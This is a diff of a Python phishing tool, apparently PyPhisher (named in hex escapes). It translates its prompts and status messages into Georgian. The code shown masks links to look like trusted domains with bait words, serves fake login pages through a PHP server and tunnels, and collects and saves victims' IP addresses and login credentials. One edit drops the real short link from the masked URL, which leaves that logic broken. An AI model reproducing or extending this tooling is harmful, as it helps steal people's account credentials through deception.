@@ -912,19 +912,19 @@ def masking(url):
         waiter()
     short = shortened.replace("https://", "")
     # Remove slash and spaces from inputs
-    domain = input(f"\n{ask}Enter custom domain(Example: google.com, yahoo.com > ")
+    domain = input(f"\n{ask}შეიყვანეთ სასურველი დომეინი(Example: www.google.com, www.yahoo.com > ")
     if domain == "":
         sprint(f"\n{error}No domain!")
         domain = "https://"
     else:
         domain = sub("([/%+&?={} ])", ".", sub("https?://", "", domain))
         domain = "https://"+domain+"-"
-    bait = input(f"\n{ask}Enter bait words with hyphen without space (Example: free-money, pubg-mod) > ")
+    bait = input(f"\n{ask}შეიყვანეთ დამატებითი სიტყვები გამოტოვების გარეშე(Example: free-money, pubg-mod) > ")
     if bait=="":
-        sprint(f"\n{error}No bait word!")
+        sprint(f"\n{error} დამატებითი სიტყვა ვერ მოიძებნა!")
     else:
         bait = sub("([/%+&?={} ])", "-", bait)+"@"
-    final = domain+bait+short
+    final = domain+bait
     print()
     #sprint(f"\n{success}Your custom url is > {bcyan}{final}")
     title = "[bold blue]Custom[/]"
@@ -990,7 +990,7 @@ def requirements():
             except Exception as e:
                 print(f"{error}{str(e)}")
             if retry == 1:
-                print(f"\n{error}You haven't allowed storage permission for termux. Closing \x50\x79\x50\x68\x69\x73\x68\x65\x72!\n")
+                print(f"\n{error}თქვენ არგაქვთ ნება დართული Termuxს გთხოვთ დართეთ ნება  Closing \x50\x79\x50\x68\x69\x73\x68\x65\x72!\n")
                 sleep(2)
                 pexit()
     internet()
@@ -1005,7 +1005,7 @@ def requirements():
         installer("ssh", "openssh")
     for package in packages:
         if not is_installed(package):
-            sprint(f"{error}{package} cannot be installed. Install it manually!{nc}")
+            sprint(f"{error}{package} Samwuxarod Ver Dainstalirda Daainstaliret Igi Tqvenit.!{nc}")
             exit(1)
     killer()
     osinfo = uname()
@@ -1100,7 +1100,7 @@ def requirements():
         if "@gmail.com" in email:
             is_mail_ok = True
         else:
-            print(f"\n{error}Only gmail with app password is allowed!{nc}")
+            print(f"\n{error}Tqven Tqvit Uari Sheyvanaze!{nc}")
             sleep(1)
 
 # Main Menu to choose phishing type
@@ -1193,9 +1193,9 @@ def server():
     clear()
     # Termux requires hotspot in some android
     if termux:
-        sprint(f"\n{info}If you haven't enabled hotspot, please enable it!")
+        sprint(f"\n{info}Tu Tqven Argaqvt Chartuli HotSpot Gtxovt Rom Chartot!")
         sleep(2)
-    sprint(f"\n{info2}Initializing PHP server at localhost:{port}....")
+    sprint(f"\n{info2}Itvirteba PHP Website localhost:{port}....")
     for logfile in [php_file, cf_file, lx_file, lhr_file]:
         delete(logfile)
         if not isfile(logfile):
@@ -1221,7 +1221,7 @@ def server():
     else:
         sprint(f"\n{error}PHP Error! Code: {status_code}")
         pexit()
-    sprint(f"\n{info2}Initializing tunnelers at same address.....")
+    sprint(f"\n{info2} Iqmneba Online Web Linkebi.....")
     internet()
     arguments = ""
     if region is not None:
@@ -1257,7 +1257,7 @@ def server():
             break
         sleep(1)
     if cf_success or lx_success or lhr_success:
-        sprint(f"\n{info}Your urls are given below:\n")
+        sprint(f"\n{info}Tqveni Link Ebi Mzadaa:\n")
         if mode == "test":
             print(f"\n{info}URL generation has completed successfully!")
             print(f"\n{info}CloudFlared: {cf_success}, LocalXpose: {lx_success}, LocalHR: {lhr_success}")
@@ -1286,21 +1286,21 @@ def server():
 def waiter():
     global is_mail_ok
     delete(ip_file, cred_file)
-    sprint(f"\n{info}{blue}Waiting for login info....{cyan}Press {red}Ctrl+C{cyan} to exit")
+    sprint(f"\n{info}{blue}Velodebit Msxverpls....{cyan}Press {red}Ctrl+C{cyan} Rata Gaxvidet")
     try:
         while True:
             if isfile(ip_file):
-                print(f"\n\n{success}{bgreen}Victim IP found!\n\007")
+                print(f"\n\n{success}{bgreen}New IP Dawerilia.!\n\007")
                 show_file_data(ip_file)
                 ipdata = cat(ip_file)
                 append(ipdata, main_ip)
                 # Just add the ip
                 append(ipdata.split("\n")[0], saved_file)
                 print(f"\n{info2}Saved in {main_ip}")
-                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
+                print(f"\n{info}{blue}Velodebit Shemdegs.....{cyan}Press {red}Ctrl+C{cyan} Rata Gaxvidet")
                 remove(ip_file)
             if isfile(cred_file):
-                print(f"\n\n{success}{bgreen}Victim login info found!\n\007")
+                print(f"\n\n{success}{bgreen}Msxverplma Sheiyvana Login Da Paroli!\n\007")
                 show_file_data(cred_file)
                 userdata = cat(cred_file)
                 if is_mail_ok:
@@ -1308,7 +1308,7 @@ def waiter():
                 append(userdata, main_cred)
                 append(userdata, saved_file)
                 print(f"\n{info2}Saved in {main_cred}")
-                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
+                print(f"\n{info}{blue}Velodebit Shemdegs.....{cyan}Press {red}Ctrl+C{cyan} Rata Gaxvidet")
                 remove(cred_file)
             sleep(0.75)
     except KeyboardInterrupt:
